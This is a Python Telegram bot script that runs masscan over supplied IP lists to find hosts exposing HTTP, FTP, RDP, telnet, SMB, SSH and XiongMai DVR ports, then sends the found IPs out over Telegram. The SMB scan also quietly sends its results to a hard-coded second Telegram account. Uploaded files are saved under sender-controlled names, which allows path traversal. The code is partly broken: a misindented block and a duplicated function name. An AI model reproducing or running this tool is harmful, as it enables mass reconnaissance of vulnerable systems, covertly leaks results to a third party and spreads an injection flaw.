import telebot
import os 
import subprocess
from telebot import types
token = '*your telegram token*'
tb=telebot.TeleBot(token)

@tb.message_handler(content_types=['document'])
def handle_docs_photo(message):

    try:
        chat_id = message.chat.id

        file_info = tb.get_file(message.document.file_id)
        downloaded_file = tb.download_file(file_info.file_path)

        src='/home/' + message.document.file_name;
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        tb.reply_to(message,"[+]Added")
    except Exception as e:
        tb.reply_to(message,e)

@tb.message_handler(commands = ['scan'])
def scan(message):
    try:
        os.system("masscan   -iL input.txt -p80,8080,8081,8888 -oX out")
        tb.reply_to(message,"[+]Scan start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out  > out.txt")
    doc = open("out.txt","rb") 
    tb.send_document("*telegram id*",doc)
    
@tb.message_handler(commands = ['scan_ftp'])
def scan_ftp(message):
    try:
        os.system("masscan   -iL input.txt -p21,20,1021 -oX out_ftp")
        tb.reply_to(message, "[+]Scan ftp start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_ftp > ftp_out.txt")
    ftp = open("ftp_out.txt","rb")
    tb.send_document("*telegram id*",ftp)
   

@tb.message_handler(commands = ['scan_rdp'])
def scan_rdp(message):
    try:
        os.system("masscan -e wlan0  -iL input.txt -p 3350-3500 -oX out_rdp")
        tb.reply_to(message,"[+]Scan rdp start")
   except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_rdp > rdp_out.txt")
    rdp = open("rdp_out.txt","rb")
    tb.send_document("*telegram id*",rdp)
    

@tb.message_handler(commands = ['scan_telnet'])
def scan_rdp(message):
    try:
        os.system("masscan -e wlan0 -iL input.txt -p 23 -oX out_telnet")
        tb.reply_to(message,"[+]Scan telnet start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_telnet > telnet_out.txt")
    tel = open("telnet_out.txt","rb")
    tb.send_document("*telegram id*",tel)
    
@tb.message_handler(commands = ['scan_smb'])
def scan_smb(message):
    try:
        os.system("masscan -e wlan0 -iL input.txt -p 445 -oX out_smb")
        tb.reply_to(message,"[+]Scan smb start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_smb > smb_out.txt")
    smb = open("smb_out.txt","rb")
    tb.send_document("*telegram id*",smb)
    ssmb = open("smb_out.txt","rb")
    tb.send_document("508112197",ssmb)
@tb.message_handler(commands = ['scan_X'])
def scan_X(message):
    try:
        os.system("masscan -e wlan0 -iL input.txt -p 34567 -oX out_x")
        tb.reply_to(message,"[+]Scan XiongMai start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_x > x_out.txt")
    x = open("x_out.txt","rb")
    tb.send_document("*telegram id*",x)
@tb.message_handler(commands = ['scan_ssh'])
def scan_ssh(message):
    try:
        os.system("masscan -e wlan0 -iL input.txt -p 22 -oX out_ssh")
        tb.reply_to(message,"[+]Scan ssh start")
    except Exception as e:
        tb.reply_to(message,e)
    os.system("grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' out_ssh > ssh_out.txt")
    ssh = open("ssh_out.txt","rb")
    tb.send_document("*telegram id*",ssh)
    


tb.polling(none_stop=True, timeout=123)

